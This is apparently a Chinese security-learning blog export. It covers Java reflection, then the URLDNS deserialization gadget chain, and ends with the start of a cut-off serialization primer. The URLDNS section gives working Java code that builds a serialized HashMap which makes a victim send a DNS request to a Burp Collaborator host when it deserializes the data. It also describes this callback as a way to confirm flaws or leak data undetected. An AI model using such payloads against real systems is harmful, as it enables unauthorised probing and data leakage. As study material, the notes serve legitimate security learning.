id="获取类里面属性"><a href="#获取类里面属性" class="headerlink" title="**获取类里面属性 **"></a>**获取类里面属性 **</h4><ol><li><p>c.getFields()（是class的一个getFields()方法，返回一个 <code>Field</code> 数组）‘</p><p>​<strong>注意：</strong>getFields()，返回的数组是每个 <code>Field</code> 对象对应类中的一个<strong>公共字段</strong>（被 <code>public</code> 修饰的字段）<br>**c.getDeclaredFields()**可以返回private</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//获取类里面属性</span></span><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75">[] personfields </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getFields</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> f</span><span style="color: #C678DD">:</span><span style="color: #E06C75">personfields){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(f);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>解析：</p><ul><li>利用的是Field</li><li>先建立一个名称为<code>personfields</code>的Field数组</li><li>遍历数组到  f （ f 是<strong>临时存储当前遍历到的数组元素</strong>的变量）</li><li>输出f</li></ul><p>输出：</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112200428456.png" alt="image-20251112200428428"></p><p>但是，此处的int类型的age没有打印出来<br><strong>原因：</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure><p>name是public，age是private</p></li><li><p><strong>但是使用<code>c.getDeclaredFields()</code>即可打印</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112200939690.png" alt="image-20251112200939655"></p></li><li><p>只传特定值（改变值）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> namefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;name&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(p,</span><span style="color: #98C379">&quot;saffs&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span></code></pre></div></div></figure><p>把上面的p（先前使用c.newInstance()的输出）的name属性改为<code>saffs</code></p><p>输出：</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251112220911373.png" alt="image-20251112220911332"></p><p><strong>getField也是私有的<code>private</code>不能修改</strong></p><p><strong>c.getDeclaredFields()     namefield.setAccessible(true);即可</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> namefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;age&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">namefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(p,</span><span style="color: #D19A66">25</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(p);</span></span></code></pre></div></div></figure><p>改成这样就有权限了</p></li></ol><h4 id="调用类里面的方法"><a href="#调用类里面的方法" class="headerlink" title="调用类里面的方法"></a><strong>调用类里面的方法</strong></h4><ol><li><p>使用 <code>c.getMethods();</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75">[] personmethods </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethods</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> m</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> personmethods){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(m);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>输出：（输出所有方法）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144539462.png" alt="image-20251113144532381"></p></li><li><p>单个方法</p><p><code>invoke（）</code>某个对象的某个方法</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> actionmethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;action&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(p, </span><span style="color: #98C379">&quot;dasqjfasqh&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>c.getMethod后面接收（方法名，class确切查询的类型）</p><p>invoke（传对象，传参数）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113144858535.png" alt="image-20251113144858506"></p></li><li><p>调用私有（同上加一个setAccessible(true）即可）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> actionmethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;action&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">actionmethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(p, </span><span style="color: #98C379">&quot;dasqjfasqh&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li></ol><h1 id="URLDNS-链"><a href="#URLDNS-链" class="headerlink" title="URLDNS 链"></a>URLDNS 链</h1><p>接上文的引出以及反射（URLDNS 链为例子）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">// System.out.println(person);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><code>java.net.URL</code> 的 <code>hashCode()</code> 方法中，会触发 <strong>DNS 请求</strong> 到该 URL 的主机名（host）</p><p>现在的目的就是<strong>利用</strong>这条链</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p>目标是调用url类的hashcode类的方法</p><p>跟进到url</p><p>找到hashcode方法</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113170516197.png" alt="image-20251113170516163"></p></li><li><p>在put的时候（跟进看看）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">put</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">K</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">V</span><span style="color: #E06C75"> value) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">putVal</span><span style="color: #E06C75">(</span><span style="color: #61AFEF">hash</span><span style="color: #E06C75">(key)</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> value</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">true</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>put调用hash（跟进hash）</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113170848928.png" alt="image-20251113170826406"></p><p>发现hash调用了hashcode</p><p><strong>所以put会发起请求</strong></p><p>也就是说，是-1（初始化）就会发起请求</p><p><code>发起请求的作用：</code></p><p>​<code>发起请求是   攻击者想要的副作用，不是防护措施。相反它被用作  证据  或  辅助手段  来利用漏洞</code></p></li><li><p>也就是到了url里面的hashcode判断</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113203025577.png" alt="image-20251113203025497"></p></li><li><p>跟进hashCode</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113203100806.png" alt="image-20251113203100761"></p><p><code>getHostAddress(u)</code> 会尝试把 URL 中的主机名解析成一个 <code>InetAddress</code> 对象（也就是 IP 地址）， 如果主机名解析成功（<code>addr</code> 不为 null），就把解析出来的 IP 地址的 <code>hashCode()</code> 加入到 <code>h</code>（整个 URL 的哈希值）里 ； 如果 DNS 没解析成功（<code>addr == null</code>），那就直接取 URL 原始的 <code>host</code> 字符串</p></li><li><p>跟进<code>getHostAddress</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251113203345131.png" alt="image-20251113203345092"></p><ul><li>如果 <code>host</code> 是 IP 地址，直接转换成 <code>InetAddress</code>，不会走 DNS</li><li>如果 <code>host</code> 是域名，这里就会向系统的 <strong>DNS 解析器</strong> 发起请求，解析成 IP</li></ul></li></ul><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>攻击者希望 <strong>在构造 &#x2F; 传输阶段不触发外联</strong>（避免被检测或提前暴露），但希望 <strong>在受害者反序列化时触发外联</strong>（证明漏洞或泄露信息）。因此：<strong>在构造时先把 <code>hashCode</code> 计算并缓存（≠ -1），再用反射把它改回 -1；序列化时不会触发；反序列化时会触发</strong>。</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> person </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Person</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;aa&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">22</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//不要在此处发起请求</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">URL</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;http://b10yq17n3kqn4ase0d6wwz9jfa109p.burpcollaborator.net&quot;</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过这里将hashcode改为-1（利用反射）</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>修改：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) throws Exception {</span></span><span class="line"><span style="color: #7F848E; font-style: italic">//    Person person = new Person(&quot;aa&quot;,22);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">URL</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> hashmap</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//这里不要发起请求,把url对象的hashcode改成不是-1</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">URL</span><span style="color: #E06C75"> url </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">URL</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;http://dta2x89uikgnnjtbztk9yexyepkh86.burpcollaborator.net&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">url</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Field</span><span style="color: #E06C75"> hashcodefield </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredField</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hashCode&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url,</span><span style="color: #D19A66">1234</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashmap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(url,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//这里把hashcode改回-1</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//通过反射 改变已有对象的属性</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">hashcodefield</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">set</span><span style="color: #ABB2BF">(url,</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(hashmap)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>没改之前，在序列化  就会受收到DNS请求（相当于是在本地发起请求，自己接收自己，不知道使用者能不能反馈）</p><p><code>（序列化本身没有发起 dns请求，是因为 HashMap 在序列化过程中调用了 URL.hashCode() ，URL.hashCode() 解析主机名发起 DNS 请求）</code></p><p>修改之后，序列化无请求，反序列化有请求（接受用户会显示dns）</p><h2 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h2><ul><li><p>new一个对象，对象里面放url</p></li><li><p>将这个对象放在hashmap里面</p></li><li><p>进行序列化</p></li><li><p>最终通过反序列的dns请求，触发对 URL 中主机的 DNS 查询或网络请求</p><p>通过外部可观测的 DNS&#x2F;HTTP 回连（OOB）来确认漏洞或窃取少量信息</p></li></ul><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>HashMap.readObject()</p><p>-&gt; HashMap.putVal()</p><p>-&gt; HashMap.hash()</p><p>-&gt; URL.hashCode()</p><p>-&gt; URLStreamHandler.hashCode()</p><p>-&gt; URLStreamHandler.hashCode.getHostAddress()</p><p>-&gt; getHostAddress.InetAddress.getByName() <code>这里发出 DNS 请求</code></p><ol><li>入口A HashMap 接受参数O</li><li>目标类B URL</li><li>目标调用B.f</li><li>A.readObject -&gt; O.f -&gt; 将B传入替换O-&gt; 即调用B.f</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java序列化和反序列化基础</title>
    <link href="/2025/11/14/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/14/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="java序列化和反序列化基础"><a href="#java序列化和反序列化基础" class="headerlink" title="java序列化和反序列化基础"></a>java序列化和反序列化基础</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p> <strong>Java序列化</strong>是指把Java对象转换为字节序列的过程（将对象在内存中的状态（字段的值等）转化为序列）</p><p><strong>Java反序列化</strong>是指把字节序列恢复为Java对象的过程。</p><p>这样做可以将属性存放到数据库中</p><p><strong>这么做原因</strong>：要在两台机器之间通过这些序列<strong>传输</strong>对象</p><p><strong>常见的序列化和反序列化协议</strong>：</p><ul><li>XML&amp;SOAP</li><li>JSON（Javascript Object Notation）</li><li>Protobuf</li></ul><p><strong>序列化是针对对象的</strong></p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p><strong>序列化：</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">SerializationTest</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> serialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">obj</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">oos</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #ABB2BF">));</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>写一个类，将内容存入文件，调用writeObject方法将其序列化</p><p><strong>反序列化</strong>：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UnserializeTest</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Object</span><span style="color: #61AFEF"> unserialize</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">Filename</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">ois</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ObjectInputStream</span><span style="color: 